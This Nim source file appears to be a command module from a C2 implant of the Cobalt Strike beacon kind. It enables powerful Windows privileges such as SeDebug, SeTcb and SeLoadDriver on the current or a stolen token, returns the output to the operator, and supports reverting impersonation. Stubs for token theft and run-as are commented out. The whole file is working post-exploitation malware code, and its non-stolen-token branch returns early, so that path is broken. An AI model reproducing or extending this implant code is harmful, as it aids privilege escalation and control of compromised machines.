import std/[endians, sequtils, strutils, strformat]
import ../../[utils, config]
import ../[types, result]
import winim
import winim/inc/winbase

var stolen_token*: HANDLE
var token_valid* = false
var priv_list = [
    SE_ASSIGNPRIMARYTOKEN_NAME,
    SE_AUDIT_NAME,
    SE_BACKUP_NAME,
    SE_CHANGE_NOTIFY_NAME,
    SE_CREATE_GLOBAL_NAME,
    SE_CREATE_PAGEFILE_NAME,
    SE_CREATE_PERMANENT_NAME,
    SE_CREATE_SYMBOLIC_LINK_NAME,
    SE_CREATE_TOKEN_NAME,
    SE_DEBUG_NAME,
    # not defined in winim
    # SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME,
    SE_ENABLE_DELEGATION_NAME,
    SE_IMPERSONATE_NAME,
    SE_INC_BASE_PRIORITY_NAME,
    SE_INCREASE_QUOTA_NAME,
    SE_INC_WORKING_SET_NAME,
    SE_LOAD_DRIVER_NAME,
    SE_LOCK_MEMORY_NAME,
    SE_MACHINE_ACCOUNT_NAME,
    SE_MANAGE_VOLUME_NAME,
    SE_PROF_SINGLE_PROCESS_NAME,
    SE_RELABEL_NAME,
    SE_REMOTE_SHUTDOWN_NAME,
    SE_RESTORE_NAME,
    SE_SECURITY_NAME,
    SE_SHUTDOWN_NAME,
    SE_SYNC_AGENT_NAME,
    SE_SYSTEM_ENVIRONMENT_NAME,
    SE_SYSTEM_PROFILE_NAME,
    SE_SYSTEMTIME_NAME,
    SE_TAKE_OWNERSHIP_NAME,
    SE_TCB_NAME,
    SE_TIME_ZONE_NAME,
    SE_TRUSTED_CREDMAN_ACCESS_NAME,
    SE_UNDOCK_NAME,
    SE_UNSOLICITED_INPUT_NAME,
]

proc get_privs_internal(privs: var seq[string]): string =
    var token: HANDLE
    if token_valid:
        token = stolen_token
    else:
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, &token) == 0:
            return "[-] OpenProcessToken failed: " & $GetLastError()
        return

    var luids: seq[LUID]
    for priv in privs:
        var luid: LUID
        if LookupPrivilegeValueW(nil, winstrConverterStringToLPWSTR(priv), &luid) == 0:
            return "[-] LookupPrivilegeValueW failed: " & $GetLastError()
        luids.add(luid)

    for i in 0..<luids.len:
        var l = luids[i]
        var la: LUID_AND_ATTRIBUTES
        la.LUID = l
        la.Attributes = SE_PRIVILEGE_ENABLED
        var tp: TOKEN_PRIVILEGES
        tp.PrivilegeCount = 1
        tp.Privileges[0] = la
        if AdjustTokenPrivileges(token, 0, &tp, 0, nil, nil) == 0:
            return &"[-] AdjustTokenPrivileges failed: {$GetLastError()}" 
        else:
            result = result & $privs[i] & "\n"

proc get_privs(buf: var seq[byte], cmd: command_type) =
    var cnt = parse_int16(buf)
    var args = parse_multiple(buf, cnt)
    var privs: seq[string]
    for i in 0..<cnt: privs.add(args[i].to_string())
    push_result(CALLBACK_OUTPUT, get_privs_internal(privs).toSeq)

proc revert_to_self(buf: var seq[byte], cmd: command_type) = 
    CloseHandle(stolen_token)
    RevertToSelf()

# proc steal_token(buf: var seq[byte], cmd: command_type)

# proc make_token(buf: var seq[byte], cmd: command_type)

# proc run_as(buf: var seq[byte], cmd: command_type)

register_command(CMD_TYPE_GET_PRIVS, get_privs)
register_command(CMD_TYPE_REV2SELF, revert_to_self)